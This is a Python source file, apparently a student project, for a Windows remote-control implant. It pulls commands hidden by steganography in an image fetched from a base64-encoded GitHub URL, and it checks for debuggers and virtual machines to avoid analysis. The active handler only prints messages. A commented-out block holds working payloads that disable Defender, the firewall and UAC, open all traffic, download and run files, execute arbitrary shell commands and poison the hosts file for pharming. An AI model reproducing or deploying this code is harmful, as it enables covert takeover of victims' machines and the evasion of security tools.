from PIL import Image
import stepic
import base64
import requests
import hashlib
import time
import os
import sys
import subprocess

def descifra(img):
    img2 = Image.open(img)
    msg = stepic.decode(img2)
    msg = base64.b64decode(msg).decode('utf-8')
    return msg.rstrip("\n")

def get_image(url_encode):
    name = "img_down.png" # nombre de la imagen de salida
    url = base64.b64decode(url_encode).decode('utf-8').rstrip()
    r = requests.get(url, headers={'Cache-Control' : 'no-cache'} , allow_redirects=True)
    open(name, "wb").write(r.content)
    #print("archivo descargado\n")
    return name

def get_md5_cmds(cmds_file):
    return hashlib.md5(open(cmds_file,'rb').read()).hexdigest()

def ejecuta(comando):
    cmd = comando.split("=") if "=" in comando else comando
    if cmd[0] == "!cmd":
        print(cmd[1][1:-1])
    elif cmd[0] == "!pharming":
        print(cmd[1][1:-1])
    elif cmd == "!disAntivirus":
        print("antivirus desactivado")
    elif cmd == "!disFirewall":
        print("firewall desactivado")
    elif cmd == "!enaTrafic":
        print("trafico habilitado")
    elif cmd == "!disUAC":
        print("UAC desactivado")
    elif cmd == "!enaUAC":
        print("UAC activado")
    elif cmd == "!getFile":
        print("Descargando archivo")  
    else:
        print("comando '%s' no encontrado" % comando)



    """ 
    if "!@desactivarAntivirus" in instruccion:
    subprocess.run(["powershell.exe", "-windowstyle" ,"hidden", "-command", "Set-MpPreference", "-DisableRealtimeMonitoring", "$true"])
    #subprocess.run(["cmd","/k","%windir%\\System32\\reg.exe", "ADD", "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender", "/v", "DisableAntiSpyware", "/t" ,"REG_DWORD", "/d", "1","/f"])
    '''
    #Archivo bat
    #base = os.environ['USERPROFILE'] + "\\AppData\\Local\\Temp\\"
    with open(ruta + "a.bat","w") as f:
        f.write("@echo off")
        f.write("sc stop windefend")
    #subprocess.run(base + "AdvancedRun.exe /EXEFilename \"a.bat\" /RunAs 8 /WindowState 0 /Run")
    '''
    elif "!@desactivarFirewall" in instruccion:
        subprocess.run("netsh advfirewall set allprofiles state off")
    elif "!@permitirTrafico" in instruccion:
        print("Permitir trafico")
        subprocess.run(["powershell.exe", "-windowstyle" ,"hidden", "-command", "New-NetFirewallRule", "-DisplayName", "TraficoEntrante", "-Action", "Allow", "-Direction", "InBound"])
        subprocess.run(["powershell.exe", "-windowstyle" ,"hidden", "-command", "New-NetFirewallRule", "-DisplayName", "TraficoSaliente", "-Action", "Allow", "-Direction", "OutBound"])
    elif "!@desactivarUAC" in instruccion:
        print("Desactivar UAC")
        subprocess.run("cmd /k %windir%\\System32\\reg.exe ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWORD /d 0 /f")
        subprocess.run("shutdown /r /s /t 30")
        ctypes.windll.user32.MessageBoxW(0, "Antes de continuar la instalación es necesario reiniciar el sistema", "Windows", 0)
        print("1")
    elif "!@activarUAC" in instruccion:
        subprocess.run("cmd /k %windir%\\System32\\reg.exe ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWORD /d 1 /f")
        ctypes.windll.user32.MessageBoxW(0, "Antes de continuar la instalación es necesario reiniciar el sistema", "Windows", 0)
        subprocess.run("shutdown -r")
        print("1")
    elif "!@descargarArchivo" in instruccion:
        print("Descargar archivo " + decodificado.split(" ", 2)[1])
        url = decodificado.split(" ")[1]
        ruta = decodificado.split(" ")[2]
        nombre = decodificado.split(" ")[3]
        if not os.path.exists(ruta):
            subprocess.run("mkdir "+ruta, shell=True)
        try:
            wget.download(url, out=ruta+"\\"+nombre)
            print("0")
        except Exception:
            print("1")
    elif "!@comando" in instruccion:
        print("Ejecutar comando " + decodificado.split(" ", 2)[1])
        cmd = decodificado.split(" ")[1]
        try:
            cmd = subprocess.run(cmd, shell=True)
            print("0")
        except FileNotFoundError:
            print("1")
    elif "!@pharming" in instruccion:
				print("Pharming " + decodificado.split(" ", 2)[1])
				ip = decodificado.split(" ")[1]
				sitio = decodificado.split(" ")[2]
				try: 
					subprocess.run("echo {0}\t{1}>>C:\\Windows\\System32\\drivers\\etc\\hosts".format(ip, sitio), shell=True)
					print("0")
				except FileNotFoundError:
					print("1") """

def in_debugger():
    gt =  getattr(sys,"gettrace", None)
    #print("entro")
    return True if gt() else False

def in_virtualenvironment():
    listaVM = ["vmware","vm","virtual","vmbox","virtualbox","hyperx"]
    vm = subprocess.check_output("powershell Get-Wmiobject win32_computersystem", shell=True)
    vm = vm.decode("ISO-8859-1").lower()
    for nombreVM in listaVM:
        if nombreVM in vm:
            #print("true")
            return True
    #print("false")
    return False

def main():
    ban_cmds = ""
    if not in_debugger() and not in_virtualenvironment():
        while True:
            cmds = get_image('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2VsY2F6YS9wcm95ZWN0b19tNS9tYWluL2ltZy9pbWdfY21kLnBuZwo=')
            md5_cmds = get_md5_cmds(cmds)
            print(md5_cmds ,ban_cmds)
            if ban_cmds != md5_cmds:
                ban_cmds = md5_cmds
                comandos = descifra(cmds).split(":")
                print(comandos)
                for comando in comandos:
                    ejecuta(comando)

            else:
                print("mismos comandos")
            print(comandos)
            os.remove(cmds)
            time.sleep(60)
    else:
        print("no se puede iniciar")
                 
if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        pass